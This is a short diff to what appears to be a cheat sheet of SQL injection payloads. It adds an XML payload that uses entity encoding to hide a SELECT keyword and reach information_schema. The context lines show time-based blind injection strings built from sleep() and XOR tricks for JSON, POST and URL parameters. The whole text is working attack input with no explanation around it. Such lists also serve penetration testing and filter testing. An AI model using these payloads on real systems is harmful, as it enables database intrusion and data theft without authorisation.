@@ -16,6 +16,8 @@ ___
 
 "accid":"25 and sleep(3)#" >> In json data
 
+<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> >> In xml data with encoding
+
 &log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd= >> Post data
 
 &comment_id=291751-sleep(5)& >>
